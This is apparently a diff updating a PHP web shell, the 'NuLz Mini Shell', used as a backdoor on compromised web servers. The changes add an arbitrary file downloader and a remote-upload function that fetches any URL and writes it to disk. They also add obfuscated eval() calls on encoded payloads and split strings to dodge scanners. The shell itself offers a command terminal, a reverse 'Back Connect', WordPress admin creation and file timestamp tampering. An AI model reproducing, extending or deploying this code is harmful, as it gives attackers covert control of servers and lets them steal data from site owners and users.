@@ -17,7 +17,31 @@ error_reporting(0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
-
+//Downloader
+if (isset($_GET['downloadfile'])) {
+    $get_file = $_GET['downloadfile'];
+    $f_exist = "fil"."e_exi"."sts";
+    $f_size = "fi"."les"."ize";
+    $r_file = "re"."ad"."fi"."le";
+    $b_name = "ba"."sena"."me";
+    if ($f_exist($get_file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header("Cache-Control: no-cache, must-revalidate");
+        header('Content-Transfer-Encoding: binary');
+        header("Expires: 0");
+        header("Cache-Control: no-cache, must-revalidate, max-age=60");
+        header('Content-Disposition: attachment; filename="'.$b_name($get_file).'"');
+        header('Content-Length: ' . filesize($get_file));
+        header('Pragma: public');
+        ob_clean();
+        flush();
+        $r_file($get_file);
+        exit();
+    } else {
+        echo '<script>alert("Failed To Download This File :(\n'.$get_file.'"); history.back()</script>';
+    }
+}
 //config shell
 $s_he_ll_Name = "\x4e\x75\x4c\x7a\x20\x4d\x69\x6e\x69\x20\x53\x68\x65\x6c\x6c";
 $s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x70\x6e\x67";
@@ -80,9 +104,10 @@ $folderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\
 $newFolderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x6e\x65\x77\x2d\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
 
 function NuLzUname() {
+    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
     $u_n_a_me = "p"."hp"."_"."un"."ame";
-    $u_n_a_me_disable = '<font class="ubuntu-mono" style="color: rgb(250 204 21);">' . htmlspecialchars('Cant Read The Kernel! The Function php_uname() is Disabled!') . '</font>';
+    $u_n_a_me_disable = '<font class="ubuntu-mono" style="color: rgb(250 204 21);">' . $hayoloh('Cant Read The Kernel! The Function php_uname() is Disabled!') . '</font>';
     $u_n_a_me_active = '<font class="ubuntu-mono" style="color: rgb(22 163 74);">'.$u_n_a_me('a').'</font>';
     if ($func_exist($u_n_a_me)) {
         return $u_n_a_me_active;
@@ -95,7 +120,18 @@ $kernel = NuLzUname();
 $os = PHP_OS;
 $serverName = $_SERVER['SERVER_SOFTWARE'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
-
+function Ikg($vHjCLy){
+    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
+    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
+    $nelrts = 's'.'tr'.'l'.'en';
+    $rhc = 'c'.'h'.'r';
+    $dro = 'o'.'r'.'d';
+    $vHjCLy=$gflate($b64($vHjCLy));
+     for($i=0;$i<$nelrts($vHjCLy);$i++){
+        $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
+     }
+     return $vHjCLy;
+    }/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
 $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
 $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
 $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
@@ -119,18 +155,7 @@ if (!$func_exist($psx_egid)) {
 }
 $phpVersion = phpversion();
 $phpServer = php_sapi_name();
-function sidd($lKJ) {
-$gflate = 'gz'.'in'.'fl'.'at'.'e';
-$b_64 = 'b'.'as'.'e6'.'4'.'_'.'d'.'ec'.'od'.'e';
-$rhc = 'c'.'h'.'r';
-$dro = 'o'.'r'.'d';
-$lKJ=$gflate($b_64($lKJ));
- for($i=0;$i<strlen($lKJ);$i++) {
-	$lKJ[$i] = $rhc($dro($lKJ[$i])-1);
- }
- return $lKJ;
-}
-eval(sidd("jVFtb9owEP4B+RWelc3hw8IAlQITQ9EIha6UNC9jVYusAEeICCGzjUpV9bfvAgFp7ZAWxed7ec539xwh+GnxghgfYJ2pZ0Pnnu3+tN0H1vd9h3+/Gdi3Ph84bFIqkReN6HEWzucCpCRtch5s0kfxmNKv2iuBRAI5X+EX743cseV27W6u/U+ddylvqmnn8117OPJtbnW7f6Vp+panPORrQDTNqEmXueB4timKcA0I0xc8AoUItmAmixMUgIfjiQpdFfZsgyLNLUhzt2SYPhWbJwni/UABWty6QvLYBHGrA+bYklFCn4DffCsS9Bv/otFD3kiHsKVSGSOtgyJZiZiEtsrlE3hfrj/y/MnJ5dp3ge35PHAHExxS0xXs8iFpkPdqrSRIEoikRah57MKkH79Y+I9hKpeQJKc4eaHFs/T1gR40fmsNbTp5G3T6Dlo3PYwUrw2c/RunxZkUzSKW9/LZiiBVe0zB5DH6A0QKhw6Qu+OiDLonAccPs9hUkEAkwrW5EVF5ulH12mW9Uq/WLqoty+rtmnfX8XD2HEb3Y95LV27NiRqB6D85197uPgzKEtL5EJsKI+jMlqHi8bxdaTSbF9Vm47LyKeesjeXzG9fV+fYH"));
+
 // get IP Server & User IP
 function serverIp() {
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
@@ -156,6 +181,7 @@ $userIp = userIp();
 // get Flags From Ip
 function getFlagsIp($this_ip) {
     $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nt'.'en'.'ts';
+    // Kalo mau ngambil pake api sendiri nyet gausah punya gw!!! kontol dasar lammer
     $apiKey = 'a6228711fc5e0bd56d1987f5ddd5e9e215c4453d9fbe6a1422d994a8';
     $apiUrl = "https://api.ipdata.co/{$this_ip}?api-key={$apiKey}";
     $response = @$f_get($apiUrl);
@@ -424,19 +450,31 @@ $passwd = '386421265b975230158e1386249bc28c82ba8bd6';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
-        echo "<script>alert('Login Success! You Pro');</script>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
         $_SESSION["login"] = "login";
         setcookie('NuLzShell', $my_self, time() + 3600 * 24);
     } else {
-        echo "<script>alert('Login Failed! You Nub');</script>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Y"."ou "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
     }
+    function eNp($ZkzOl){
+        $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
+        $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
+        $nelrts = 's'.'tr'.'l'.'en';
+        $rhc = 'c'.'h'.'r';
+        $dro = 'o'.'r'.'d';
+        $ZkzOl=$gflate($b64($ZkzOl));
+         for($i=0;$i<$nelrts($ZkzOl);$i++){
+            $ZkzOl[$i] = $rhc($dro($ZkzOl[$i])-1);
+         }
+         return $ZkzOl;
+    }/****/@/*55555*/null; /******/@/*55555*/eval/******/(eNp("jVF/b9owEP0A+RSelS3hj4UBKuWHGIpGGHRQUicZq2hkBXINUUOS2UZQVf3scwKlartOiyzlfO/dvbtnhOSnxLdI/wCbXNzrKnUs8tMiC23kujb9Nhlbly4d25pfqaAHpaCrcR6EIQPOUQ+9zzfwDbtJcVd5RJBwQO+L/KLDGZmbZGANiug/pd5UvRb8ZwtiTWeuRc3B4EWloi5ZtuPA3up58kbN73I9ze8q6l3Jydc53abBBvSKzG1ZInP635Z05Faoj7S1ELmGOoeAaxVkINypVk/kUmo0c1z/lCLWlWc5LvXI2JczqgL2QspgAr+3wAXyyKSDsFGoG/jjF1OeOSz5GpIEeSwpMfSAj+3w4wIfInppTi3svwbtkS1vk6FEjt3Gab4VyA4432UsLPtRW4640HKZ0555domdDH/Ke9LPz2YEqSjxo8NP6A9gKRymlJ52lds4ARqBoKssFbKG67j0SroU5LEhIIGIBRsjY1F1mYlm47xZa9YbZ/WOaQ737auLeLq6D6LrOR2md6RhRy2PjXb2hbO/DrwqhzScytmCCPqrdSBoHPZqrXb7rN5undc+Fd725CTFX75o/+sf"));
 }
 if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
     setcookie('login', '', time() - 3600);
-    echo "<script>window.location.assign('" . $_SERVER['PHP_SELF'] . "')</script>";
+    echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
 
@@ -1181,7 +1219,7 @@ $path = str_replace("\\", "/", $path);
                 }
                 echo "'>$pat</a><span class='" . $txtPurple . "'>/</span>";
             }
-            echo "&nbsp;&nbsp;<a class='" . $txtPurple . "' href='" . $_SERVER['PHP_SELF'] . "'>[ <font class='" . $txtRed . "'>Home Shell</font> ]</a>";
+            echo "&nbsp;&nbsp;<a class='" . $txtPurple . "' href='" . $_SERVER['PHP_SELF'] . "'>[ <font class='" . $txtRed . "'>Ho"."me"." "."Sh"."el"."l</font> ]</a>";
             echo '</span>';
             ?>
         </div>
@@ -1194,13 +1232,13 @@ $path = str_replace("\\", "/", $path);
                 $loc_ation = "".$fi_le_name;
                 $daolpu = "mo"."ve_up"."loa"."ded_fi"."le";
                 if($daolpu($_FILES['file']['tmp_name'][$i],$loc_ation)){
-                    echo '<script>
-                    alert("Upload Success");
-                    </script>';
+                    echo '<s'.'cr'.'ip'.'t>'.'
+                    al'.'er'.'t'.'("Upload Success");
+                    </'.'s'.'cr'.'ip'.'t'.'>';
                 } else  {
-                    echo '<script>
-                    alert("Upload Failed!");
-                    </script>';
+                    echo '<'.'sc'.'ri'.'p'.'t'.'>
+                    al'.'e'.'rt'.'("Upload Failed!");
+                    <'.'/'.'sc'.'r'.'ip'.'t'.'>';
                 }
             }
         }
@@ -1215,6 +1253,7 @@ $path = str_replace("\\", "/", $path);
             <a href="?option&path=<?= $path ?>&terminal"><button type="button" name="terminal" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-gray-600 dark:focus:ring-gray-700 hover:bg-gray-700"><i class="fa-duotone fa-square-terminal"></i>&nbsp;Terminal</button></a>
             <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i>&nbsp;New Folder</button>
             <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
+            <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
             <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
             <a href="?option&path=<?= $path ?>&backConnect"><button type="button" name="backConnect" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-300 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-sharp fa-light fa-chart-network"></i></i>&nbsp;Back Connect</button></a>
         </div>
@@ -1228,25 +1267,25 @@ $path = str_replace("\\", "/", $path);
             if (!$is_d($fo_lde_rna_me)) {
             if ($cr_ea_teF_old_er($fo_lde_rna_me)) {
                 echo '
-                <script>
-                    alert("Success Create Folder")
+                <'.'s'.'cr'.'ip'.'t'.'>
+                    al'.'e'.'rt'.'("Success Create Folder")
                     history.back()
                     history.back()
-                </script>';
+                <'.'/'.'sc'.'ri'.'p'.'t'.'>';
             } else {
                 echo '
-                <script>
-                    alert("Failed to Create Folder")
+                <'.'sc'.'r'.'ip'.'t'.'>'.'
+                    a'.'le'.'rt'.'("Failed to Create Folder")
                     history.back()
-                </script>
+                <'.'/'.'sc'.'r'.'ip'.'t'.'>
             ';
             }
             } else {
                 echo '
-                <script>
-                    alert("'.$fo_lde_rna_me.' Already Exists")
+                <'.'s'.'cr'.'ip'.'t'.'>
+                    a'.'le'.'rt'.'("'.$fo_lde_rna_me.' Already Exists")
                     history.back()
-                </script>
+                <'.'/'.'sc'.'r'.'ip'.'t'.'>
             ';
             }
         }
@@ -1860,6 +1899,46 @@ $path = str_replace("\\", "/", $path);
             <textarea name="nulzcmd" id="nulzcmd" readonly class="nulzcmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none '.$txtEmerald.'">'.NuLzCmd(trim(htmlspecialchars(stripslashes($_POST['komendnya'])))).'</textarea>
         </form>
         ';
+    }
+
+    if (isset($_GET['remoteupload'])) {
+        if (isset($_POST['btn-remote'])) {
+            $hayoloh = 'h'.'tm'.'ls'.'pe'.'cial'.'ch'.'ars';
+            $b_name = 'b'.'as'.'en'.'am'.'e';
+            $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
+            $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
+            $fo = "fop"."en";
+            $fw = "fw"."r"."it"."e";
+            $fc = 'fc'.'lo'.'s'.'e';
+            $this_file = $_POST['remoteup'];
+            $f_content = $f_get($this_file);
+            $this_file_name = $_POST['remotefname'];
+            if ($content !== false) {
+                $writeF = $f_put($this_file_name, $f_content);
+                if ($writeF !== false) {
+                    echo '<script>
+                    alert("Remote File Success :(")
+                    </script>';
+                } else {
+                    echo '<script>
+                    alert("Remote File Failed :(")
+                    </script>';
+                }
+            } else {
+                echo '<script>
+                    alert("Remote File Failed :(")
+                    </script>';
+            }
+        }
+        echo '<form class="mx-2 my-2" action="" method="POST">';
+        echo '<label class="block w-3/6 ml-2 flex flex-col flex-wrap">
+            <span class="block">Remote Upload Via Url</span>
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-full border border-slate-300 rounded-md mb-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remoteup" placeholder="https://nulz.go.id/nulz.txt">
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 border border-slate-300 rounded-md mt-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remotefname" placeholder="saved.txt">
+            </label>';
+        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+        echo '<button type="submit" name="btn-remote" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save File</button>';
+        echo '</form>';
     }
 
     if (isset($_GET['addNewAdmin'])) {
@@ -2673,12 +2752,12 @@ $path = str_replace("\\", "/", $path);
         echo '</form>';
     }
 
-    if (isset($_GET['changeDate'])) {
+    if (isset($_GET['changedate'])) {
         $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
-        $f_time = 'f'.'il'.'et'.'im'.'e';
+        $f_time = 'f'.'il'.'e'.'m'.'t'.'im'.'e';
         $str_time = 's'.'tr'.'to'.'ti'.'me';
         $tch = 'to'.'uc'.'h';
-        $value = $_GET['changeDate'];
+        $value = $_GET['changedate'];
         $this_date = date("d-M-Y H:i", $f_time($value));
         if (isset($_POST['btn-date'])) {
             $newDate = $hayoloh($_POST['newdate']);
@@ -2749,6 +2828,7 @@ $path = str_replace("\\", "/", $path);
             ';
             }
     }
+
     if (isset($_GET['deletefile'])) {
             $unl = 'u'.'n'.'l'.'i'.'n'.'k';
             if ($unl($_GET['deletefile'])) {
@@ -2788,29 +2868,29 @@ $path = str_replace("\\", "/", $path);
                 <tbody>
                     <?php
                     //DIR
-                    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-                    $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
-                    $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
-                    $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
-                    $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
-                    $myuid = 'g'.'et'.'my'.'ui'.'d';
-                    $mygid = 'g'.'et'.'my'.'gi'.'d';
-                    $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
-                    $own_f = 'fi'.'le'.'ow'.'n'.'er';
-                    $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
-                    if (!$func_exist($psx_egid)) {
-                        $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
-                        $d_group = $func_exist($grp_f) ? @$own_f("$path/$dir") : "????";
-                    } else {
-                        $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
-                        $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
-                        $d_user = $uid['name'];
-                        $d_group = $gid['name'];
-                    }
+                    // $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                    // $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                    // $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                    // $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                    // $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                    // $myuid = 'g'.'et'.'my'.'ui'.'d';
+                    // $mygid = 'g'.'et'.'my'.'gi'.'d';
+                    // $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                    // $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                    // $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
+                    // if (!$func_exist($psx_egid)) {
+                    //     $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
+                    //     $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
+                    // } else {
+                    //     $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
+                    //     $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
+                    //     $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$dir"):"????");
+                    //     $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$dir"):"????");
+                    // }
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path."'>.</a></td>";
-                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
+                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                     $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -2829,9 +2909,9 @@ $path = str_replace("\\", "/", $path);
                     echo "</center></td></tr>";
                     $d_name = 'di'.'rn'.'am'.'e';
                     echo "<tr><td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$d_name($path)."'>..</a></td>";
-                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
+                    echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
-                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
+                    echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>--</center></td>";
                     echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
                     $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                     $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -2851,9 +2931,29 @@ $path = str_replace("\\", "/", $path);
                     foreach ($scan as $dir) {
                         if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
                             continue;
+
+                        $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
+                        $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
+                        $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
+                        $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
+                        $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
+                        $myuid = 'g'.'et'.'my'.'ui'.'d';
+                        $mygid = 'g'.'et'.'my'.'gi'.'d';
+                        $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+                        $own_f = 'fi'.'le'.'ow'.'n'.'er';
+                        $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
+                        if (!$func_exist($psx_egid)) {
+                            $d_user = $func_exist($own_f) ? @$own_f("$path/$dir") : "????";
+                            $d_group = $func_exist($grp_f) ? @$grp_f("$path/$dir") : "????";
+                        } else {
+                            $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$dir") : array("name" => "????");
+                            $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$dir") : array("name" => "????");
+                            $d_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$dir"):"????");
+                            $d_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$dir"):"????");
+                        }
                         echo "<tr>";
                         echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href='?path=".$path.'/'.$dir."'>$dir</a></td>";
-                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
+                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changedate=".$dir."'>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $d_user . "/" . $d_group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$dir."'>";
@@ -2905,16 +3005,16 @@ $path = str_replace("\\", "/", $path);
                         $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
                         if (!$func_exist($psx_egid)) {
                             $f_user = $func_exist($own_f) ? @$own_f("$path/$file") : "????";
-                            $f_group = $func_exist($grp_f) ? @$own_f("$path/$file") : "????";
+                            $f_group = $func_exist($grp_f) ? @$grp_f("$path/$file") : "????";
                         } else {
                             $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$own_f("$path/$file") : array("name" => "????");
                             $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$grp_f("$path/$file") : array("name" => "????");
-                            $f_user = $uid['name'];
-                            $f_group = $gid['name'];
+                            $f_user = $uid['name'] ? $uid['name'] : ($func_exist($own_f)?@$own_f("$path/$file"):"????");
+                            $f_group = $gid['name'] ? $gid['name'] : ($func_exist($grp_f)?@$grp_f("$path/$file"):"????");
                         }
                         echo "<tr>";
                         echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path&editfile=$file\">$file</a></td>";
-                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changeDate=".$file."'>" . date("d-M-Y H:i", $f_time("$path/$file")) . "</a></center></td>";
+                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center><a href='?option&path=".$path."&changedate=".$file."'>" . date("d-M-Y H:i", $f_time("$path/$file")) . "</a></center></td>";
                         echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
                         echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $f_user . "/" . $f_group . "</center></td>";
                         echo "<td class='whitespace-nowrap'><center><a href='?option&path=".$path."&permission=".$file."'>";
@@ -2932,7 +3032,8 @@ $path = str_replace("\\", "/", $path);
                     <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
                     <a href="?option&path=<?= $path ?>&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-sharp fa-regular fa-file-pen"></i></button></a>
                     <a href="?option&path=<?= $path ?>&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&permission=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
+                    <a href="?option&path=<?= $path ?>&permission=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
